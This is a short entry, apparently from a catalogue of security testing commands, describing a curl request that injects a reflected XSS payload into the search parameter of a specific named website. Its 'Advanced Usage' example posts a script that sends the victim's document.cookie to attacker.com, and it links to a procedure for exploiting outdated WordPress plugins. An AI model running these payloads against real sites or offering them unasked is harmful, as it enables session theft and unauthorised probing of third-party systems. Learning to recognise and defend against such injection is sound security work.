---
id: h8i9j0k1-l2m3-4567-hijk-890123456789
data: >-
  curl -X GET "https://www.uberxgermany.com/?s=<script>alert(1)</script>" -H
  "User-Agent: Mozilla/5.0"
tags:
  - xss
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:49.740Z'
verified: false
validated: true
submitted: true
---
# curl-xss-payload

## Command

```bash
curl -X GET "https://www.uberxgermany.com/?s=<script>alert(1)</script>" -H "User-Agent: Mozilla/5.0"
```

## Description

Tests for XSS by injecting a script payload into a query parameter and retrieving the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| URL with payload | Injected script in param | Yes |
| `-H "User-Agent: ..."` | Mimic browser | No |

## Examples

### Basic Usage

```bash
curl "https://example.com/search?q=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -X POST https://example.com/search -d "q=<script>fetch('http://attacker.com?data='+document.cookie)</script>"
```

## Expected Output

Response body containing the unescaped payload, indicating vulnerability (e.g., raw <script> tag).

## Related

- [[Related Procedure: Exploit-XSS-in-Outdated-WordPress-Plugins]]
